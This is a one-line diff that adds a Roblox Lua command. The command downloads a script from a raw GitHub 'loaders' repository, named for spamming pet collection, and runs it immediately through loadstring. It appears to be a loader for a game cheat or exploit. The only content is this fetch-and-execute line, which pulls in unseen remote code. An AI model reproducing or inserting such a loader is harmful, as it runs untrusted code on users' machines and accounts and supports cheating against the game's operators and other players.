@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/collect-all-pets-spam7-p3ws3t29o9qfp9.lua"))()
